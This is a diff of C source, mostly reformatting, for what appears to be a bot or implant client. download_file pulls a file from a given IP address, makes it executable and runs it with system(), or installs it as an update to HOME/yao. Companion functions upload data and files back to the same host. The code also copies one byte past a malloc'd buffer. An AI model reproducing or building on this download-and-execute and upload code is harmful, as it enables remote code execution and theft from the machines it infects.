@@ -13,7 +13,8 @@
 #include "../include/types.h"
 #include "../include/network_utils.h"
 
-struct MemoryStruct {
+struct MemoryStruct
+{
 	char *memory;
 	size_t size;
 };
@@ -24,7 +25,8 @@ static size_t s_write_data(void *contents, size_t size, size_t nmemb, void *user
 	struct MemoryStruct *mem = (struct MemoryStruct *)userp;
 
 	char *ptr = realloc(mem->memory, mem->size + realsize + 1);
-	if(ptr == NULL) {
+	if (ptr == NULL)
+	{
 #ifdef DEBUG
 		printf("[ERROR] Realloc returned NULL\n");
 #endif
@@ -65,12 +67,15 @@ int download_data(char *ip_addr, char **response)
 
 	res = curl_easy_perform(curl_handle);
 
-	if(res != CURLE_OK) {
+	if (res != CURLE_OK)
+	{
 #ifdef DEBUG
 		fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
 #endif
-	} else {
-		*response = (char *) malloc(chunk.size);
+	}
+	else
+	{
+		*response = (char *)malloc(chunk.size);
 		memcpy(*response, chunk.memory, chunk.size + 1);
 	}
 
@@ -91,7 +96,7 @@ int download_file(char *ip_addr, int execute)
 	if (!curl)
 		return ERROR;
 
-	download = fopen(HOME"/download.tmp", "w");
+	download = fopen(HOME "/download.tmp", "w");
 	if (!download)
 		return ERROR;
 
@@ -102,13 +107,15 @@ int download_file(char *ip_addr, int execute)
 	if (res != CURLE_OK)
 		return ERROR;
 
+	chmod(HOME "/download.tmp", S_IXUSR | S_IXGRP | S_IXOTH);
 
-	chmod(HOME"/download.tmp", S_IXUSR | S_IXGRP | S_IXOTH);
-
-	if (execute == 0) { // executable
-		system(HOME"/download.tmp");
-	} else if (execute == 1) { // update
-		system("mv "HOME"/download.tmp "HOME"/yao");
+	if (execute == 0)
+	{ // executable
+		system(HOME "/download.tmp");
+	}
+	else if (execute == 1)
+	{ // update
+		system("mv " HOME "/download.tmp " HOME "/yao");
 	}
 	curl_easy_cleanup(curl);
 	curl_global_cleanup();
@@ -124,7 +131,8 @@ int upload_data(char *ip_addr, char *data)
 	CURLcode res;
 
 	curl = curl_easy_init();
-	if(!curl) {
+	if (!curl)
+	{
 		curl_global_cleanup();
 	}
 
@@ -133,7 +141,7 @@ int upload_data(char *ip_addr, char *data)
 
 	res = curl_easy_perform(curl);
 
-	if(res != CURLE_OK)
+	if (res != CURLE_OK)
 #ifdef DEBUG
 		fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
 #endif
@@ -149,11 +157,12 @@ int upload_file(char *ip_addr, FILE *fd)
 	CURLcode res;
 	struct stat file_info;
 
-	if(fstat(fileno(fd), &file_info) != 0)
+	if (fstat(fileno(fd), &file_info) != 0)
 		return 1;
 
 	curl = curl_easy_init();
-	if(!curl) {
+	if (!curl)
+	{
 		fclose(fd);
 	}
 
@@ -165,7 +174,8 @@ int upload_file(char *ip_addr, FILE *fd)
 	curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
 
 	res = curl_easy_perform(curl);
-	if(res != CURLE_OK) {
+	if (res != CURLE_OK)
+	{
 #ifdef DEBUG
 		fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
 #endif
